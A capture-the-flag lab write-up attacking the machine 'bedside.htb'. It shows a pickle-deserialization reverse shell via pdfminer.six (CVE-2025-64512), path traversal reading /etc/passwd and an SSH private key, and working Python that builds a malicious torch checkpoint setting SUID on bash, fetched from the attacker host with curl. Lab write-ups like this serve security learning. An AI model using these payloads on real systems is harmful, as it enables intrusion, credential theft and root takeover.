## 1. Reconnaissance

I started with an Nmap scan to identify open ports and running services.

```bash
nmap -sV bedside.htb
```

```
Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-08 10:33 +0200
Nmap scan report for bedside.htb (10.129.119.194)
Host is up (0.060s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
53/tcp   open     domain?
80/tcp   open     http    Apache httpd 2.4.68
3000/tcp filtered ppp
Service Info: Host: default; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Both SSH and Apache are running recent, patched versions, so the entry point is unlikely to be a known CVE in the services themselves — the vulnerability almost certainly lives in whatever application is running on top of them. Port 3000 is filtered from the outside, which hints at an internal-only service worth revisiting once I have a foothold.

I added the main hostname to `/etc/hosts`:

```bash
echo "10.129.119.194 bedside.htb" | sudo tee -a /etc/hosts
```

---

## 2. Enumeration

### 2.1 Virtual host discovery

The front page (`bedside.htb`) is a static clinic homepage with no interactive functionality — no login form, no file upload, nothing that takes user input. Since the real attack surface wasn't on the main site, I fuzzed for virtual hosts:

```bash
gobuster vhost -u http://bedside.htb \
  -w Documents/CTF/SecLists-master/Discovery/DNS/subdomains-top1million-5000.txt \
  --append-domain --exclude-status 301
```

```
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                       http://bedside.htb
[+] Method:                    GET
[+] Threads:                   10
[+] Wordlist:                  Documents/CTF/SecLists-master/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:                gobuster/3.8.2
[+] Timeout:                   10s
[+] Append Domain:             true
[+] Exclude Hostname Length:   false
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
research.bedside.htb Status: 200 [Size: 3152]
Progress: 4989 / 4989 (100.00%)
===============================================================
Finished
===============================================================
```

One hit: `research.bedside.htb`. I added it to `/etc/hosts` and moved on to enumerate it.

```bash
echo "10.129.119.194 research.bedside.htb" | sudo tee -a /etc/hosts
```

### 2.2 The research portal

`research.bedside.htb` hosts the "Bedside Research Portal," which allows staff to upload X-rays, CT scans, and research documents for AI model training. The page lists accepted formats as `jpeg, jpg, png, bmp, tiff, dcm, pdf`, and mentions that "collections can be uploaded as archives" and that files "may be converted to standardized formats" before training — both strong signals that uploaded files are parsed server-side.

Checking the raw response headers revealed a custom header that isn't set by any framework by default:

```
X-Powered-By: pdfminer.six
```

This told me the backend processes uploaded PDFs with `pdfminer.six`, giving me a specific library to target for known vulnerabilities.

### 2.3 Probing the upload filter

To understand how the filter validates files, I first sent a deliberately broken PDF:

```bash
echo "NOTAPDF" > broken.pdf
curl -s -X POST http://research.bedside.htb/ \
  -F 'uploadFile=@broken.pdf'
```

```
<div class="message">MIME type mismatch. Unable to upload file to destination /var/www/research.bedside.htb/uploads</div>
```

Two important things came out of this single error message:

1. **The filter inspects file content, not just the extension** — a malformed `.pdf`/`.gz` is rejected outright.
2. **The absolute upload path is leaked**: `/var/www/research.bedside.htb/uploads`.

I also tested invalid extensions directly and found that, in addition to the publicly advertised formats, the backend silently accepts `gz` and `zip` — undocumented archive support that pointed toward file-parsing logic running behind the scenes.

### 2.4 Identifying the vulnerability — CVE-2025-64512

With `pdfminer.six` confirmed as the parsing engine and an upload path in hand, I targeted **CVE-2025-64512**: `pdfminer.six` loads CMap files via Python's `pickle` module, and a crafted PDF can point a font's `/Encoding` entry at an attacker-controlled `.pickle.gz` path. When the PDF is parsed, pdfminer unpickles that file — and unpickling attacker-controlled data leads directly to remote code execution.

I used a two-stage version of the public PoC, splitting the payload into:

- `sh.pickle.gz` — a valid gzip stream containing a malicious pickle (`__reduce__` returning an `os.system` reverse shell call), uploaded under the leaked path.
- `trigger.pdf` — an otherwise ordinary PDF whose `/Encoding` reference points at the absolute path of `sh.pickle.gz`.

bash

```bash
python3 creat.py 10.10.17.186 4444
```

```
[1] uploaded sh.pickle.gz
[2] uploaded trigger.pdf -> wating cron ~30s
```

A background watcher process (`pdf_watcher.py`, discovered later on the box) periodically globs the uploads directory for `*.pdf` files and feeds each one to `pdf2txt.py` (pdfminer's CLI). Roughly 30 seconds after the upload, the watcher parsed `trigger.pdf`, followed the `/Encoding` reference, and unpickled `sh.pickle.gz` — executing my payload.

---

## 3. Foothold

```bash
nc -lv 4444
```

```
bash: cannot set terminal process group (398): Inappropriate ioctl for device
bash: no job control in this shell
datawrangler@data-wrangler:/app$ id
id
uid=988(datawrangler) gid=1001(dataops) groups=1001(dataops)
```

I had a shell as `datawrangler`, inside a container (hostname `data-wrangler`), belonging to the `dataops` group — a detail that becomes important during privilege escalation, since it grants write access to a shared `/datastore` volume used later by the host's training pipeline.

---

## 4. User Flag

### 4.1 Pivoting off the container

The container was minimal (only `curl` and `python3`, no network tools). I read the default gateway from `/proc/net/route` and swept common ports against it, discovering an internal-only service on port 3000 — a "Bedside Clinic Image Viewer" React app that was not reachable from outside the Docker network (matching the `filtered` state seen in the initial Nmap scan).

The viewer's `fetchSlices()` function turned out to be entirely client-side (randomly generated demo data, no real backend API). However, the static file server behind it was vulnerable to path traversal against the **host** filesystem:

```bash
curl -s --path-as-is 'http://172.17.0.1:3000/../../../../etc/passwd'
```

This confirmed a user `developer` (uid 1000) existed on the host, with a real bash shell. I used the same traversal to pull their SSH private key and the user flag directly:

```bash
curl -s --path-as-is 'http://172.17.0.1:3000/../../../../home/developer/.ssh/id_rsa'
curl -s --path-as-is 'http://172.17.0.1:3000/../../../../home/developer/user.txt'
```

### 4.2 Logging in as developer

```bash
chmod 600 dev_key
ssh -i dev_key developer@bedside.htb
```

```
developer@bedside:~$ ls -la
total 44
drwx------ 7 developer developer 4096 Oct  8 11:07 .
drwxr-xr-x 3 root      root      4096 Jul 13 14:00 ..
lrwxrwxrwx 1 root      root         9 Jul 13 12:02 .bash_history -> /dev/null
-rw-r--r-- 1 developer developer  220 Nov  9  2025 .bash_logout
-rw-r--r-- 1 developer developer 3526 Nov  9  2025 .bashrc
drwxrwxr-x 3 developer developer 4096 Oct  8 11:07 .config
drwxrwxr-x 4 developer developer 4096 Oct  8 11:07 .local
-rw-r--r-- 1 developer developer  807 Nov  9  2025 .profile
drwxrwxr-x 3 developer developer 4096 Jul 13 14:00 projects
drwxrwxr-x 2 developer developer 4096 Jul 13 14:00 .ssh
-rw-r----- 1 root      developer   33 Oct  8 09:33 user.txt
drwxrwxr-x 3 developer developer 4096 Oct  8 11:06 .warp
```

bash

```bash
cat user.txt
```


---

## 5. Privilege Escalation

### 5.1 Sudo rights

```bash
sudo -l
```

```
Matching Defaults entries for developer on bedside:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin, use_pty

User developer may run the following commands on bedside:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py
```

`developer` can run a MONAI-based training script as root, with no password. Reading the script revealed it loads the most recent checkpoint from `/datastore/checkpoints/*.pt` using MONAI's `CheckpointLoader`, which internally calls `torch.load(..., weights_only=False)` — another insecure deserialization sink, structurally identical to the pdfminer CVE used for the foothold.

### 5.2 Constraints to work around

1. **No data, no checkpoint load**: the trainer only reaches the checkpoint loader if `/datastore/processed/` contains valid image data; otherwise it tries to promote files from `/datastore/staging/` first, and exits if both are empty.
2. **No direct write access**: `developer` is not in the `dataops` group and cannot write to `/datastore` directly — but `datawrangler` (my container shell) is.
3. **Format validation**: `torch.load` expects a real torch archive (a ZIP containing `archive/data.pkl` and `archive/version`), not a bare pickle — a bare pickle is rejected.
4. **A competing background job**: a watcher continuously repopulates `/datastore/processed/` and `/datastore/staging/`, racing against any manual cleanup.

### 5.3 Crafting a malicious checkpoint

On my attack host (where `torch` is available), I built a valid torch archive whose embedded object executes a command via `__reduce__`:

```python
import os, pickle, zipfile

class RCE:
    def __init__(self, cmd):
        self.cmd = cmd
    def __reduce__(self):
        return (os.system, (self.cmd,))

payload = pickle.dumps({"model": RCE("chmod +s /bin/bash")}, protocol=2)

with zipfile.ZipFile("checkpoint_epoch_99.pt", "w", zipfile.ZIP_STORED) as z:
    z.writestr("archive/data.pkl", payload)
    z.writestr("archive/version", "3\n")
```

I served the file and pulled it into the container as `datawrangler`:

```bash
# attack host
python3 -m http.server 8000

# container, as datawrangler
cd /tmp
curl -s -o evil.pt http://10.10.17.186:8000/checkpoint_epoch_99.pt
head -c4 evil.pt | od -An -tx1   # 50 4b 03 04 — valid ZIP/PK signature
cp evil.pt /datastore/checkpoints/checkpoint_epoch_99.pt
```

### 5.4 Winning the race

I couldn't delete the PDFs still feeding the upstream watcher (owned by another user), so I ran a tight loop as `datawrangler` to keep the data pipeline in a state the trainer would accept, cycling far faster than the watcher's own interval:

```bash
# build one valid PNG for the dataloader to pick up
python3 -c "
import struct, zlib
def chunk(n,d):
    c=n+d; return struct.pack('>I',len(d))+c+struct.pack('>I',zlib.crc32(c)&0xffffffff)
png = b'\x89PNG\r\n\x1a\n'+chunk(b'IHDR',struct.pack('>IIBBBBB',64,64,8,2,0,0,0))+chunk(b'IDAT',zlib.compress(b'\x00'+b'\xff\x00\x00'*64)*64)+chunk(b'IEND',b'')
open('/tmp/scan.png','wb').write(png)
"

while true; do
  rm -f /datastore/staging/*.txt /datastore/processed/*.txt 2>/dev/null
  cp -n /tmp/scan.png /datastore/processed/scan.png 2>/dev/null
  sleep 0.3
done
```

With the loop running, I triggered the trainer from the `developer` session:

```bash
sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py
```

The script eventually raises `TypeError: Expected state_dict to be dict-like, got <class 'int'>` — this is expected and harmless: `os.system()` returns an integer exit code, which MONAI's loader doesn't know how to consume. By the time that exception fires, the payload has already executed as root.

### 5.5 Confirming privilege escalation

```bash
ls -la /bin/bash
```

```
-rwsr-sr-x 1 root root 1298416 May  9 12:07 /bin/bash
```

The SUID/SGID bits are now set on `/bin/bash`.

```bash
/bin/bash -p
id
```

```
uid=1000(developer) euid=0(root) egid=0(root) groups=0(root),...
```

---

## 6. Root Flag

```bash
cat /root/root.txt
```
